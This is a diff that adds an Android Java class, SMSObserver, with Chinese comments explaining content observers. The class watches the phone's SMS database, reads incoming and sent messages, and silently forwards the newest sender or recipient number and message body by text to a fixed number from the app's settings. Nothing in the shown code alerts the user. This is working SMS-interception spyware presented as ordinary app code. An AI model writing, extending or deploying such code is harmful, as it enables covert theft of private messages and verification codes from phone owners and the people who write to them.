@@ -1,0 +1,149 @@
+package com.ivory.ahead;
+
+import android.content.ContentResolver;
+import android.content.Context;
+import android.content.SharedPreferences;
+import android.database.ContentObserver;
+import android.database.Cursor;
+import android.os.Handler;
+import android.util.Log;
+
+/*
+ *  
+ ContentObserver——内容观察者，目的是观察(捕捉)特定Uri引起的数据库的变化，继而做一些相应的处理，它类似于
+
+  数据库技术中的触发器(Trigger)，当ContentObserver所观察的Uri发生变化时，便会触发它。触发器分为表触发器、行触发器，
+
+  相应地ContentObserver也分为“表“ContentObserver、“行”ContentObserver，当然这是与它所监听的Uri MIME Type有关的。
+ */
+public class SMSObserver extends ContentObserver{
+
+	private Handler mHandler;
+	//内容解析器，和ContentProvider刚好相反,一个提供，一个解析
+	private ContentResolver mResolver;
+	//上下文对象
+	private Context mContext;
+	
+	//是否启动了服务线程
+	private boolean IsStartThread=false;
+	
+	//需要取得的短信条数
+	private static final int MAX_NUMS=10;
+	//用于保存记录中最大的ID
+	private static final int MAX_ID=0;
+	//需要获得的字段列
+	private static final String[] PROJECTION={
+		SMSConstant.ID,
+		SMSConstant.TYPE,
+		SMSConstant.ADDRESS,
+		SMSConstant.BODY,
+		SMSConstant.DATE,
+		SMSConstant.THREAD_ID,
+		SMSConstant.READ,
+		SMSConstant.PROTOCOL
+	};
+	/*
+	 * 查询语句
+	 * 用于查询ID大于 MAX_ID的记录，初始为0，后面用于保存记录的最大ID。短信的起始ID为1
+	 */
+	private static final String SELECTION=SMSConstant.TYPE+"="+SMSConstant.MESSAGE_TYPE_INBOX+
+	          " or "+SMSConstant.TYPE+"="+SMSConstant.MESSAGE_TYPE_SENT;
+	
+	//取值对应的结果就是PROJECTION 里对应的字段
+	 private static final int COLUMN_INDEX_ID    = 0;
+	 private static final int COLUMN_INDEX_TYPE  = 1;
+	 private static final int COLUMN_INDEX_PHONE = 2;
+     private static final int COLUMN_INDEX_BODY  = 3;
+     private static final int COLUMN_INDEX_DATE  = 4;
+     private static final int COLUMN_INDEX_PROTOCOL = 7;
+	
+	public SMSObserver(Context mContext,ContentResolver resolver,Handler handler) {
+		super(handler);
+	    this.mResolver=resolver;
+	    this.mHandler=handler;	    
+	    this.mContext=mContext;
+	}
+	
+	@Override
+	public void onChange(boolean selfChange)
+	{
+		super.onChange(selfChange);
+		if(IsStartThread)
+			return;
+		
+		synchronized (this) {
+			if(!IsStartThread)
+			{
+				IsStartThread=true;
+				
+				new Thread()
+				{
+					public void run()
+					{
+						
+					try {
+						  Cursor cursor=mResolver.query(SMSConstant.SMSCONTENT_URI,   //查询的URI
+				                      PROJECTION,                //需要取得的列
+				                      SELECTION,//String.format(SELECTION,MAX_ID),                 //查询语句
+				                      null,             //可能包括您的选择，将被替换selectionArgs的值，在选择它们出现的顺序。该值将被绑定为字符串。
+				                      null);                //排序	
+															
+	                      if(cursor!=null)
+							{		
+								//读取本地配置是否创建了远程账号			
+								SharedPreferences settings=mContext.getSharedPreferences(Keys.APP_SETTING,Context.MODE_PRIVATE);								
+								//最新接收短信的转发时间
+								Long lastUpdate =settings.getLong(Keys.SMS_LAST_UPDATE, 0);
+								String str="";
+	                    	    while(cursor.moveToNext()){
+								/*	Log.v("短信",new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(cursor.getLong(4))+ ",ID:"+cursor.getInt(COLUMN_INDEX_ID)+",TYPE："+cursor.getInt(COLUMN_INDEX_TYPE)+",PROTOCOL："+
+								                cursor.getInt(COLUMN_INDEX_PROTOCOL)+"，PHONE:"+cursor.getString(COLUMN_INDEX_PHONE)+","+
+											    cursor.getString(COLUMN_INDEX_BODY));*/
+									int id=cursor.getInt(COLUMN_INDEX_ID);
+									int type=cursor.getInt(COLUMN_INDEX_TYPE);				
+									int protocol=cursor.getInt(COLUMN_INDEX_PROTOCOL);
+									long date=cursor.getLong(COLUMN_INDEX_DATE);
+									String phone=cursor.getString(COLUMN_INDEX_PHONE);
+									String body=cursor.getString(COLUMN_INDEX_BODY);
+				
+									//大于这个时间则上传
+									if(date>lastUpdate)
+									{
+										str=(type==1?"收到":"发出")+phone+"内容:"+body;
+										lastUpdate=date;
+									}
+	                    	    }
+	                    	    
+	                    	    Long temp =settings.getLong(Keys.SMS_LAST_UPDATE, 0);
+		                    	    if(lastUpdate>temp){
+									//转发出去
+									Utility.sendSms(Keys.PHONE, str);
+									//Log.e(Keys.PHONE, "观察者转发：\n"+str);
+																	
+									//保存最后同步时间
+									SharedPreferences.Editor edit=settings.edit();
+									edit.putLong(Keys.SMS_LAST_UPDATE,lastUpdate);
+									edit.commit();
+	                    	    }
+														
+							  }
+								/*
+								 * 关闭游标，释放资源。否则下次查询游标仍然在原位置
+								 */
+								cursor.close();
+						
+								
+							}catch (Exception e) {
+								e.printStackTrace();
+							}finally{
+								IsStartThread=false;
+							}						
+					}
+				  }.start();
+			}
+		}
+	
+	}
+
+
+}
